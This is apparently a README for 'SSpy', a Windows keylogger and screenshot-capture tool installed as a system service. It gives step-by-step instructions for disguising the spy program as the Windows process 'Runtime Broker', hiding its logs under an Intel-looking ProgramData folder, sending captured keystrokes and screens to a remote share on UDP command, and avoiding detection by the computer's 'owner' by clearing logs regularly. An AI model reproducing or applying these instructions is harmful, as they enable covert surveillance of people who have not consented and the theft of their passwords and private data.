# SSpy
**Current version: 0.32 alpha**

SSpy is a keylogger & screenshoter based on the Windows system services. Once installed as a service, he is going to capture all data provided.

Program was tested on Windows 10 and was written in Visual Studio 17.

### More about application
Application is split between 2 programs. SSpy is a base application that handle service operations such as install, remove service and he also makes sure that Spy app works correctly. When SSpy start working, he will install Spy program named `Runtime Broker`, located `C:\\Windows` folder. After installation Spy application is running by itself and its job is to handle and save all keyboard input and capture screenshot provided by user to `timestamp.txt` and `timestamp.jpg` files located at `C:\\ProgramData\\Intel\\AGS\\Temp\\Logs`. And it also listens udp message and act by messages like start or stop service, send captured data, send any data in path by message from udp message app(this is another project, I named it `ai`). Captured screens are jpeg files and file size is normally 100KB per image. You can set image quality, file size is depend on image quality. Currently jpeg image quality is 30(of 100). If it's hard to recognize captured image, increase quality to 40 or 50 or even higher. But file size will be increased.
Keystrokes are logged in timestamp.txt(e.g. 0713164723.txt). Function keys like `Enter`, `Delete`, `Arrow Up`, ... are logged with unpersand(`&`)following key name and with space(e.g. ` &Enter `, ` &Delete `, ` &Up `). alphabet and numbers and special keys(`~!@#$%^...`) are stored as character. Space is also stored as character(` `). `Enter` and `Tab` makes new line in log file. Every new line has its timestamp when first character of line is stored. Keylog file will be made newly with current timestamp if there's no keylog file in folder. If file exist, key strokes are stored to existing log file.

##### Action by Message
1 - start capture
2 - pause capture
3 - send captured data, delete after send, continue capture
4 - send captured data, delete after send, pause capture
5 - send any data in path followed argument.(e.g. `ai send xx.xx.xx.xx:80 5 d:\\foldername`)
**important note: I couldn't test with folder which its name contain space like "dev tools" or "windows 10".
if you give space, the word followed space will be set as next argument. if you need to copy even folder with space in its name, contact me.**

You are using this application at your own risk.

### Working On
- [ ] change hardcoded paths
- [ ] major improvements to Spy application
- [ ] help

### How to use this application

##### Before Compile
1. You need to share a folder with write permission
2. At other's computer, open your shared folder, enter your username and password to open. It will help Spy app to send captured data to this shared folder.
3. Replace your ip address and shared folder name in Spy project/Spy.cpp/#38: `remotepath` e.g. `\\\\192.168.1.3\\sharedfolder\\`
4. Replace capture screenshot time interval(currently it's 2 second. it means capture 1 screen in every 2 seconds)

##### Compile
Compilation is handled manually for now. To compile this program you need **Windows Vista or later and a C compiler**.
I compiled with Visual Studio 2022(17.10.4) in Windows 10.

##### Install / Remove service
1. Make sure that SSpy and Spy is compiled & rebuilded and copy Spy.exe to `C:\\windows` and change file name to `Runtime Broker`(without any file extension).
2. To install service, in the folder where `SSpy.exe` exist, open CMD.exe console with Administrator permission and write `SSpy.exe install` command. You can install simply by Run as administrator `SSpy.exe`.
3. I'm not sure reboot OS is required or not. I tested without reboot but it works well.
4. After install, open service manager(Win + R, services.msc) and start `Runtime Broker Service`.
5. If firewall asks to allow app, click OK.
Service starts capture and stores captured data to `C:\\ProgramData\\Intel\\AGS\\Temp\\Logs`

There's nothing more to do. Captured data will take some capacity of hard disk, so take care to send captured data regularly or at least pause capture. Otherwise owner might detect by increasing hard disk used data capacity. one image file size is 100KB. capture 1 image per 2 second. It means 50KB/s. 50KB * 60 * 60 * 24 * 4 = 17280000KB If you didn't copy and delete captured data for 4 days, stored data size would be 17.28GB. If you take one per 5s, it will decrease to 6.912GB. hh

To uninstall service, in step 2 write command `SSpy.exe remove`

### Appendix
Check Readme in ai project to learn how to control spy app.